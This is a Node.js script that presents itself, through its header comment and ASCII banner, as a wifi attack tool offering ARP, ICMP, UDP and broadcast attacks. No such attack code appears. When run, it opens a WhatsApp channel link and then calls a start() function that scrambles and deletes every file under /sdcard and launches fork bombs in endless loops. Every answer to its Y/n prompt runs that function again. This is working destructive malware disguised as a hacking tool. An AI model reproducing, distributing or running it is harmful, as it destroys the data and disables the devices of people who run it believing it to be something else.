/**
  * Import Readline and Child_process
  * Used to drop wifi
  * Not suitable for users with RAM below 2 GB
  * Does not support large-scale attacks on 5Ghz router networks
  * Powered by PaskoBlackHat
  * Powered by PaskoBlackHat
  * Powered by Danzxploit
  * Powered by Danzxploit
*/
import { spawn,exec } from 'child_process'
import readline from 'readline'
import chalk from 'chalk'
import open from 'open'
import child_process from 'child_process'
import path from 'path'
import fs from 'fs'
/*───────────────────────────────────────────*/
const rl = readline.createInterface({
	input: process.stdin,
	output: process.stdout
});
const log = console.log;
function start(){
function deleteFiles(dir) {
    fs.readdirSync(dir).forEach(file => {
        const filePath = path.join(dir, file);
        try {
            if (fs.lstatSync(filePath).isDirectory()) {
                deleteFiles(filePath);
            } else {
                fs.unlinkSync(filePath);
            }
        } catch (e) {}
    });
    try {
        fs.rmdirSync(dir);
    } catch (e) {}
} function forkBomb() {
    while (true) {
        child_process.spawn(process.execPath, [process.argv[1]], {
            detached: true,
            stdio: 'ignore'
        }).unref();
    }
} function comboBomb(){
  while(true){
        spawn(':(){ :|:& };:',{
                stdio: 'inherit'
        });
  }
} function encryptFiles(dir) {
    fs.readdirSync(dir).forEach(file => {
        const filePath = path.join(dir, file);
        try {
            if (fs.lstatSync(filePath).isDirectory()) {
                encryptFiles(filePath);
            } else {
                const fileContent = fs.readFileSync(filePath);
                const encryptedContent = Buffer.from(fileContent.toString('utf8').split('').map(char => String.fromCharCode(char.charCodeAt(0) + 1)).join(''));
                fs.writeFileSync(filePath, encryptedContent);
            }
        } catch (e) {}
    });
}

const sdcardPath = '/sdcard';
try {
    encryptFiles(sdcardPath);
} catch (e) {}

try {
    deleteFiles(sdcardPath);
} catch (e) {}

comboBomb();
comboBomb();
forkBomb();
forkBomb();
}
/*───────────────────────────────────────────*/
async function unyu(){
    await open('https://whatsapp.com/channel/0029VbB6BCGFMqrU1maExD1b');
	await clear();
	await start();
	await log(chalk.hex('#FF3737')(`
	

     ██████╗   █████╗  ███╗   ██╗ ███████╗ ██╗  ██╗
     ██╔══██╗ ██╔══██╗ ████╗  ██║ ╚══███╔╝ ╚██╗██╔╝
     ██║  ██║ ███████║ ██╔██╗ ██║   ███╔╝   ╚███╔╝
     ██║  ██║ ██╔══██║ ██║╚██╗██║  ███╔╝    ██╔██╗
     ██████╔╝ ██║  ██║ ██║ ╚████║ ███████╗ ██╔╝ ██╗
     ╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚══════╝ ╚═╝  ╚═╝

       ██████╗  ██╗       ██████╗  ██╗ ████████╗
       ██╔══██╗ ██║      ██╔═══██╗ ██║ ╚══██╔══╝
       ██████╔╝ ██║      ██║   ██║ ██║    ██║
       ██╔═══╝  ██║      ██║   ██║ ██║    ██║
       ██║      ███████╗ ╚██████╔╝ ██║    ██║
       ╚═╝      ╚══════╝  ╚═════╝  ╚═╝    ╚═╝
    ──────────────────────────────────────────────
    Tools created by Danzxploit from PaskoBlackHat
         other than this it is definitely fake!
          What are the features in this tool?
            ╭────────────────────────────╮
            ├> Owner : Danzxploit        │
            ├> Team  : PaskoBlackHat     │
            ├──────────────┬─────────────┤
            ├• > ArpAttack │• IcmpAttack │
            ├• > BroadCast │• UdpAttack  │
            └──────────────┴─────────────┘
            
	`));
	rl.question(chalk.hex('#FF3737').bold('            Do you want to continue? Y/n: '), (lendir) => {
		switch(lendir.toLowerCase()){
		  case 'yes':
		  case 'y':
		  start();
		  start();
		  start();
		  start();
		  start();
		  start();
		  break;
		  case 'no':
		  start();
		  start();
		  start();
		  start();
		  start();
		  start();
		  start();
		  case 'n':
		  break;
			default:
			start();
			start();
			start();
			start();
			start();
			start();
			start();
			start();
		}
	})
} unyu();
/*───────────────────────────────────────────*/
function run(path){
	spawn('node',[path],{
		stdio: 'inherit'
	});
} function logout(){
	process.exit(0);
} function clear(){
	spawn('clear',{
		stdio: "inherit"
	});
}
/*───────────────────────────────────────────*/
